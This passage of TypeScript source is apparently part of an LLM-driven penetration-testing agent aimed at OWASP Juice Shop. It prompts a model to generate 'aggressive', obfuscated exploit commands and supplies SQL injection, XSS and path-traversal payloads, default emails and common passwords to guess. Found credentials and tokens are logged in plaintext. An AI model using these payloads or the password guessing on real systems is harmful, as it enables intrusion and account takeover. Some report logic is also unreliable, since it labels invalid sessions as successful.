${state.hasValidJWT ? `- You have a VALID JWT. Use it for all authenticated requests.` : `- If ${authEndpoint} fails with "Unexpected path", try ${authEndpointAlt} as fallback`}
- SQL Injection: GET ${sqliEndpoint}?q=<payload> (NOT POST)
- Authenticated API: Use "Authorization: Bearer <JWT>" header ONLY after obtaining a real JWT

## KNOWN EMAILS (from Alpha recon and this session)
${knownEmails.length > 0 ? knownEmails.join(', ') : 'admin@juice-sh.op, user@juice-sh.op'}

## LOGIN STRATEGY (CRITICAL - MUST FOLLOW WHEN hasValidJWT=false)
When attempting login:
1. Use POST ${authEndpoint} with JSON body {"email":"...", "password":"..."}
2. Try known emails first: ${knownEmails.length > 0 ? knownEmails.join(', ') : 'acc0unt4nt@juice-sh.op, rsa_lord@juice-sh.op, jwtn3d@juice-sh.op, admin@juice-sh.op'}
3. Try common passwords: password123, admin123, admin, 123456, juiceshop
4. After login, check if response contains {"token":"eyJ..."} - if so, store it and use for authenticated requests

## EXPLOIT STRATEGY BY TYPE
- IDOR: Target /rest/basket/{id}, /rest/address/{id}, /rest/order-history/{id} with known user IDs
- SQLi: Use GET ${sqliEndpoint}?q=' OR '1'='1 on validated SQLi endpoint
- XSS: Target /api/feedback, /rest/track-order with <script>alert(1)</script> payloads
- JWT: If you get a token response, use it immediately in subsequent requests
- Path Traversal: Use /ftp/../../etc/passwd format

## Commands Already Run (${state.commandsRun.size} total)
${commandsRun || 'No commands run yet'}

## Findings Collected (verified only)
${findings || 'No verified findings yet'}

## Your Task
${state.authFocusMode ? `**PRIMARY: Obtain valid JWT via ${authEndpoint}**
Generate 5-8 login attempts with different email/password combinations. Be creative - try variations, encoding, SQL injection in credentials, etc.` : `**BE CREATIVE AND AGGRESSIVE**
Generate 10-15 diverse exploit commands. Think outside the box:
- Try novel attack vectors you haven't tested yet
- Combine multiple techniques (e.g., SQLi + XSS in same request)
- Test edge cases and boundary conditions
- Explore endpoints Alpha didn't test
- Try different encoding, case variation, and obfuscation
- If stuck, try completely different approach - unexpected angles often work`}

CRITICAL RULES:
- NEVER use placeholder tokens like <JWT_TOKEN> or <NEWLY_OBTAINED_TOKEN> - they will be rejected
- NEVER send Authorization headers unless you have a REAL, VALID JWT from ${authEndpoint}
- ${state.authFocusMode ? 'You MUST focus on authentication first.' : 'Use obtained JWT for authenticated requests.'}
- Use GET method for SQLi on ${sqliEndpoint} (confirmed vulnerable)

Generate commands that:
- Target specific endpoints Alpha discovered
- Test for SQLi, XSS, IDOR, auth bypass, info disclosure, XXE, SSRF, path traversal
- Use appropriate payloads for escalation level: ${state.escalationLevel}
- Include proper headers and content types
- Be diverse - don't repeat similar commands

Output commands in XML format with reasoning. Be creative!`;
  }

  private buildResultSummary(results: CommandResult[]): string {
    const lines: string[] = ['## Command Results\n'];

    for (const result of results) {
      lines.push(`### ${result.command.tool}: ${result.command.exploitType}`);
      lines.push(`Command: ${result.command.command}`);
      lines.push(`Success: ${result.success}`);
      lines.push(`Exit Code: ${result.exit_code}`);
      lines.push(`Timed Out: ${result.timed_out}`);

      if (result.stdout) {
        const truncated = result.stdout.length > 300
          ? result.stdout
          : result.stdout;
        lines.push(`Output: ${truncated}`);
      }

      if (result.finding) {
        lines.push(`FINDING: [${result.finding.type}] ${result.finding.value}`);
      }

      lines.push('');
    }

    return lines.join('\n');
  }

  private async readFindingsReport(missionId: string): Promise<string> {
    try {
      const homeDir = process.env.HOME || '/tmp';
      const reportPath = path.join(homeDir, 'recon-reports', missionId, 'findings_report.md');

      if (fs.existsSync(reportPath)) {
        const content = fs.readFileSync(reportPath, 'utf-8');
        return content;
      }
    } catch (e) {
      console.log(`[${this.agentId}] Failed to read findings report: ${e}`);
    }
    return '';
  }

  private hashCommand(command: string): string {
    const normalized = command
      .toLowerCase()
      .replace(/\s+/g, ' ')
      .replace(/[<>"]/g, '')
      .trim()
      .substring(0, 500);

    let hash = 0;
    for (let i = 0; i < normalized.length; i++) {
      const char = normalized.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }

    return Math.abs(hash).toString(36).substring(0, this.COMMAND_HASH_SIZE);
  }

  private async finalizeExploitSession(state: GammaExploitState): Promise<void> {
    console.log(`\n[${this.agentId}] === Exploit Session Finalized ===`);
    console.log(`[${this.agentId}] Mission: ${state.missionId}`);
    console.log(`[${this.agentId}] Total Commands Run: ${state.commandsRun.size}`);
    console.log(`[${this.agentId}] Total Findings: ${state.findings.length}`);

    const credentials = state.findings.filter(f => f.type === 'credential' || f.type === 'token' || f.type === 'secret');
    if (credentials.length > 0) {
      console.log(`[${this.agentId}] === CRITICAL: Credentials Found ===`);
      for (const cred of credentials) {
        console.log(`[${this.agentId}] ${cred.type}: ${cred.value}`);
      }
    }

    await this.saveExploitReport(state);

    this.exploitState.delete(state.missionId);
    this.transitionTo('COOLDOWN', 'exploit complete');

    await this.emit('exploit_completed', {
      missionId: state.missionId,
      target: state.target,
      commandsRun: state.commandsRun.size,
      findings: state.findings,
      credentialsFound: credentials.length,
    });
  }

  private async saveIterationReport(state: GammaExploitState, results: CommandResult[]): Promise<void> {
    try {
      const homeDir = process.env.HOME || '/tmp';
      const reportDir = path.join(homeDir, 'exploit-reports', state.missionId);
      fs.mkdirSync(reportDir, { recursive: true });

      const iterationReport = `# Iteration ${state.iteration} Report - Mission ${state.missionId}

## Iteration Summary
- **Timestamp:** ${new Date().toISOString()}
- **Escalation Level:** ${state.escalationLevel}
- **Commands Executed:** ${results.length}
- **Successful Commands:** ${results.filter(r => r.success).length}

## Command Results
${results.map(r => `### ${r.command.tool}: ${r.command.exploitType}
- **Command:** \`${r.command.command}\`
- **Success:** ${r.success}
- **Exit Code:** ${r.exit_code}
- **Output:** ${r.stdout || '(none)'}
${r.finding ? `- **Finding:** [${r.finding.type}] ${r.finding.value}` : ''}
`).join('\n')}

## Findings This Iteration
${state.findings.filter(f => f.timestamp >= Date.now() - 60000).map(f =>
  `- **[${f.type.toUpperCase()}]** ${f.value} (from ${f.source})`
).join('\n') || 'No new findings this iteration.'}

## Session State
- **JWT Obtained:** ${state.hasValidJWT ? 'Yes (VALID)' : state.sessionObtained ? 'Yes (INVALID FORMAT)' : 'No'}
- **Authenticated:** ${state.authenticated ? 'Yes' : 'No'}
${state.validJWT ? `- **JWT:** ${state.validJWT}` : ''}
- **Total Findings:** ${state.findings.length}
- **Total Commands:** ${state.commandsRun.size}
- **Auth Attempts:** ${state.authAttempts}/${state.maxAuthAttempts}

---
*Generated at ${new Date().toISOString()}*
`;

      const filename = path.join(reportDir, `iteration_${state.iteration}_report.md`);
      fs.writeFileSync(filename, iterationReport);
      console.log(`[${this.agentId}] Saved iteration report to ${filename}`);

      const combinedReport = this.buildCombinedReport(state);
      const combinedFilename = path.join(reportDir, 'findings_report.md');
      fs.writeFileSync(combinedFilename, combinedReport);
      console.log(`[${this.agentId}] Saved combined report to ${combinedFilename}`);

    } catch (e) {
      console.error(`[${this.agentId}] Failed to save iteration report: ${e}`);
    }
  }

  private buildCombinedReport(state: GammaExploitState): string {
    const credentials = state.findings.filter(f => ['credential', 'token', 'secret'].includes(f.type));
    return `# Exploit Findings Report - Mission ${state.missionId}

## Current Session Status
- **Target:** ${state.targetUrl}
- **Current Iteration:** ${state.iteration}
- **Escalation Level:** ${state.escalationLevel}
- **JWT Obtained:** ${state.hasValidJWT ? 'VALID JWT' : state.sessionObtained ? 'JWT (invalid format)' : 'No'}
- **Auth Attempts:** ${state.authAttempts}/${state.maxAuthAttempts}
- **Total Commands Run:** ${state.commandsRun.size}
- **Total Findings:** ${state.findings.length}

## All Findings
${state.findings.map((f, i) => `
### ${i + 1}. [${f.type.toUpperCase()}]
- **Value:** ${f.value}
- **Source:** ${f.source}
- **Timestamp:** ${new Date(f.timestamp).toISOString()}
`).join('\n')}

## Credentials/Tokens
${credentials.length > 0 ? credentials.map(f => `- [${f.type}] ${f.value}`).join('\n') : 'No credentials extracted yet.'}

## Commands Run
${Array.from(state.commandsRun.values()).map(c =>
  `- [${c.exploitType}] ${c.tool}: ${c.command}`
).join('\n')}

---
*Report generated by Gamma Exploit Agent*
`;
  }

  private async saveExploitReport(state: GammaExploitState): Promise<void> {
    try {
      const homeDir = process.env.HOME || '/tmp';
      const reportDir = path.join(homeDir, 'exploit-reports', state.missionId);
      fs.mkdirSync(reportDir, { recursive: true });

      const credentials = state.findings.filter(f => ['credential', 'token', 'secret'].includes(f.type));
      const vulnerabilities = state.findings.filter(f => ['vulnerability', 'info'].includes(f.type));
      const endpoints = state.findings.filter(f => f.type === 'endpoint');

      const reportContent = `# Exploit Report - Mission ${state.missionId}

## Executive Summary

**Target:** ${state.targetUrl}
**Completed:** ${new Date().toISOString()}
**Iterations Completed:** ${state.iteration}
**Escalation Level:** ${state.escalationLevel}

### Attack Summary
| Metric | Count |
|--------|-------|
| Total Commands Run | ${state.commandsRun.size} |
| Total Findings | ${state.findings.length} |
| Credentials/Tokens Found | ${credentials.length} |
| Vulnerabilities Identified | ${vulnerabilities.length} |
| Endpoints Discovered | ${endpoints.length} |

### Outcome Assessment
${state.hasValidJWT ? '**SUCCESS**: Valid JWT obtained and authentication successful. The agent successfully authenticated and used the JWT for subsequent requests.' : state.sessionObtained ? '**SUCCESS**: Valid JWT obtained and authentication successful.' : state.authenticated ? '**SUCCESS**: Authentication successful.' : credentials.length > 0 ? '**PARTIAL**: Credentials extracted but no valid JWT obtained.' : '**PARTIAL**: No credentials extracted. See detailed findings below.'}

${state.validJWT ? `### Valid JWT Obtained
\`\`\`
${state.validJWT}
\`\`\`
**Note:** This token can be used for authenticated requests.` : ''}

---

## Critical Findings (Credentials & Tokens)

${credentials.length > 0 ? credentials.map(f => `### ${f.type.toUpperCase()}: ${(f.value.split('\n')[0] || f.value)}

- **Value:** \`${f.value}\`
- **Source:** ${f.source}
- **Timestamp:** ${new Date(f.timestamp).toISOString()}

`).join('\n---\n') : 'No credentials or tokens were extracted during this exploit session.'}

---

## Detailed Findings

### Findings by Type

| Type | Count | Details |
|------|-------|---------|
${(() => {
  const byType: Record<string, Finding[]> = {};
  for (const f of state.findings) {
    if (!byType[f.type]) byType[f.type] = [];
    byType[f.type]!.push(f);
  }
  return Object.entries(byType).map(([type, items]) =>
    `| ${type} | ${items.length} | ${items.map(i => i.value).join(', ')} |`
  ).join('\n');
})()}

### All Findings
${state.findings.map((f, i) => `
**${i + 1}. [${f.type.toUpperCase()}]**
- **Value:** ${f.value}
- **Source:** ${f.source}
- **Discovered:** ${new Date(f.timestamp).toISOString()}
`).join('\n')}

---

## Exploit Execution Log

### Commands by Exploit Type

${(() => {
  const byType: Record<string, ExploitCommand[]> = {};
  for (const cmd of state.commandsRun.values()) {
    if (!byType[cmd.exploitType]) byType[cmd.exploitType] = [];
    byType[cmd.exploitType]!.push(cmd);
  }
  return Object.entries(byType).map(([type, cmds]) =>
    `#### ${type.toUpperCase()} (${cmds.length} commands)\n${cmds.map(c => `- \`${c.tool}\`: ${c.command}`).join('\n')}`
  ).join('\n');
})()}

### All Commands Executed (${state.commandsRun.size} total)

| # | Tool | Exploit Type | Command |
|---|------|--------------|---------|
${Array.from(state.commandsRun.values()).map((c, i) => `| ${i + 1} | ${c.tool} | ${c.exploitType} | \`${c.command}\` |`).join('\n')}

---

## Iteration Analysis

### Escalation Progress
- **Initial Level:** baseline
- **Final Level:** ${state.escalationLevel}
- **Escalations:** ${state.escalationLevel !== 'baseline' ? 'Yes (escalated during self-critic reflection)' : 'No'}

### Per-Iteration Breakdown

| Iteration | Commands Run | Successful | Findings | Escalation |
|-----------|--------------|------------|----------|------------|
${state.iterationResults.map(r => `| ${r.iteration} | ${r.commandsRun} | ${r.commandsSuccessful} | ${r.newFindings.length} | ${r.escalationLevel} |`).join('\n')}

### Iteration Details
${state.iterationResults.map(r => `
#### Iteration ${r.iteration} (${new Date(r.timestamp).toISOString()})
- **Escalation Level:** ${r.escalationLevel}
- **Commands Executed:** ${r.commandsRun}
- **Successful Commands:** ${r.commandsSuccessful}
- **New Findings:** ${r.newFindings.length > 0 ? r.newFindings.map(f => `[${f.type}] ${f.value}`).join(', ') : 'None'}
`).join('\n')}

---

## Recommendations

${(() => {
  const recommendations: string[] = [];

  if (state.hasValidJWT) {
    recommendations.push('### Valid JWT Obtained - Post-Auth Exploitation');
    recommendations.push(`1. **JWT is valid**: ${state.validJWT}`);
    recommendations.push('2. **Enumerate users**: GET /rest/admin/users with Authorization header');
    recommendations.push('3. **Test IDOR**: Try /rest/basket/1, /rest/basket/2, /rest/order-history/1');
    recommendations.push('4. **Admin config**: GET /rest/admin/application-configuration');
    recommendations.push('5. **User data**: GET /api/Users with JWT');
    return recommendations.join('\n');
  }

  if (!state.sessionObtained && !state.authenticated) {
    recommendations.push('### Authentication Not Achieved');
    recommendations.push('1. **Use login endpoint**: POST /rest/user/login with {"email":"admin@juice-sh.op","password":"admin123"}');
    recommendations.push('2. **Try known emails**: admin@juice-sh.op, acc0unt4nt@juice-sh.op, rsa_lord@juice-sh.op');
    recommendations.push('3. **Try common passwords**: password123, admin123, admin, 123456, juiceshop');
    recommendations.push('4. **Avoid placeholder tokens**: Never use <JWT_TOKEN> - obtain real JWT first');
    return recommendations.join('\n');
  }

  if (state.sessionObtained && state.validJWT && !state.hasValidJWT) {
    recommendations.push('### Session Obtained but JWT Invalid');
    recommendations.push('1. **Re-authenticate**: The session token may not be a valid JWT');
    recommendations.push('2. **Try different credentials**: Different email/password combinations');
    recommendations.push('3. **Check token format**: JWT should be eyJ... format with 3 parts');
  }

  const rejectedCommands = state.iterationResults.reduce((acc, r) => acc + (r.commandsRun - r.commandsSuccessful), 0);
  if (rejectedCommands > 0) {
    recommendations.push(`### Command Rejections Detected (${rejectedCommands} commands)`);
    recommendations.push('1. **Check for placeholder tokens**: Commands with <JWT_TOKEN> or <NEWLY_OBTAINED_TOKEN> are rejected');
    recommendations.push('2. **Verify JWT before authenticated requests**: Only use Authorization headers with real JWT');
  }

  const sqliAttempts = Array.from(state.commandsRun.values()).filter(c => c.exploitType.toLowerCase().includes('sqli')).length;
  if (sqliAttempts > 0 && !state.sessionObtained) {
    recommendations.push('### SQL Injection Status');
    recommendations.push('1. **Use GET method for /rest/products/search**: Confirmed vulnerable endpoint');
    recommendations.push('2. **Avoid POST to /api/Products**: This endpoint is not confirmed vulnerable');
  }

  if (recommendations.length === 0) {
    recommendations.push('### General Recommendations');
    recommendations.push('1. **Increase iteration count** for more exploit attempts');
    recommendations.push('2. **Try different exploit types**: XSS, IDOR, XXE, path traversal');
    recommendations.push('3. **Target additional endpoints** discovered during reconnaissance');
  }

  return recommendations.join('\n');
})()}

---

## Technical Notes

- **Target Application:** OWASP Juice Shop (or similar vulnerable app)
- **Exploit Framework:** Gamma Exploit Agent (MiniMax-M2.7)
- **Session ID:** ${state.missionId}
- **Report Generated:** ${new Date().toISOString()}

### Alpha Recon Intelligence Used
The following findings from Alpha reconnaissance informed this exploit session:
${state.findings.length > 0 ? '- See findings report for Alpha\'s discovered endpoints and vulnerabilities' : '- No Alpha findings available - using built-in exploit knowledge'}

---

*Report generated by Solaris Gamma Exploit Agent*
`;

      const reportPath = path.join(reportDir, 'exploit_report.md');
      fs.writeFileSync(reportPath, reportContent);
      console.log(`[${this.agentId}] Saved exploit report to ${reportPath}`);

    } catch (e) {
      console.error(`[${this.agentId}] Failed to save exploit report: ${e}`);
    }
  }
}